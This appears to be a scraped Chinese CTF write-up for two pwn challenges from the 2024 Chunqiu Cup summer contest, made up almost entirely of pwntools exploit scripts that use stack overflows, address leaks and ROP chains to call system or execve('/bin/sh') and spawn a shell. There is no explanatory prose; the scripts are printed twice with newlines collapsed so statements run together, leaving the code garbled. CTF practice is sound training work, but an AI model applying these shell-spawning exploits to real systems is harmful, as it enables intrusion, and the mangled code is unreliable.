# web选手入门pwn(17) ——2024年春秋杯夏季赛pwn

> 原文: https://www.ctfiot.com/198409.html
> ID: 198409

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./pwn","b *vulnnc")#sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
vuln = 0x40125D
payload = "A"*88 + p64(vuln)sh.sendline(payload)
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(exit_plt)sh.send(payload)sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")libc_puts = libc.sym['puts']libc_system = libc.sym['execve']libc_binsh = libc.search('/bin/sh').next()
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3pop_rsi_r15_ret = 0x4013d1

payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")print(hex(puts_addr))libc_base = puts_addr - libc_putssystem_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
pop_rdx_r12_ret = 0x11c1e1 + libc_base
payload = "B"*40 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0)+ p64(0) + p64(pop_rdx_r12_ret) + p64(0) + p64(0) + p64(system_addr)sh.send(payload)
sh.interactive()

dGhpcyBpcyBwYXNzd29yZA==[0x0]dGhpcyBpcyBwYXNzd29yZA==[0x1]

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./main","b *0x5555555554fanc")#sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")sh.interactive()

sh.sendline("A"*72)

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")
payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297#print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_basebio_fun = 0x146A + text_base
sh.sendlineafter("n]","n")sh.sendlineafter("length: ","-1")
payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_puts = libc.sym['puts']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_baseret = 0x1567 + text_basebio_fun = 0x146A + text_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = puts_addr - libc_putsprint(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_atoi = libc.sym['atoi']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*56sh.sendline(payload)atoi_16_addr = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")libc_base = atoi_16_addr - libc_atoi - 16print(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_basepop_rdi_ret = 0x27725 + libc_baseret = 0x270c2 + libc_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()


```
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./pwn","b *vulnnc")#sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
vuln = 0x40125D
payload = "A"*88 + p64(vuln)sh.sendline(payload)
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(exit_plt)sh.send(payload)sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")libc_puts = libc.sym['puts']libc_system = libc.sym['execve']libc_binsh = libc.search('/bin/sh').next()
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3pop_rsi_r15_ret = 0x4013d1

payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")print(hex(puts_addr))libc_base = puts_addr - libc_putssystem_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
pop_rdx_r12_ret = 0x11c1e1 + libc_base
payload = "B"*40 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0)+ p64(0) + p64(pop_rdx_r12_ret) + p64(0) + p64(0) + p64(system_addr)sh.send(payload)
sh.interactive()
dGhpcyBpcyBwYXNzd29yZA==[0x0]dGhpcyBpcyBwYXNzd29yZA==[0x1]
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./main","b *0x5555555554fanc")#sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")sh.interactive()
sh.sendline("A"*72)
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")
payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297#print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_basebio_fun = 0x146A + text_base
sh.sendlineafter("n]","n")sh.sendlineafter("length: ","-1")
payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_puts = libc.sym['puts']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_baseret = 0x1567 + text_basebio_fun = 0x146A + text_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = puts_addr - libc_putsprint(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_atoi = libc.sym['atoi']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*56sh.sendline(payload)atoi_16_addr = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")libc_base = atoi_16_addr - libc_atoi - 16print(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_basepop_rdi_ret = 0x27725 + libc_baseret = 0x270c2 + libc_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1723199228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/10-1723199229.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/6-1723199230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1723199232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1723199234.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/2-1723199235.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/0-1723199236.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/1-1723199237.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1723199238.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1723199239.png)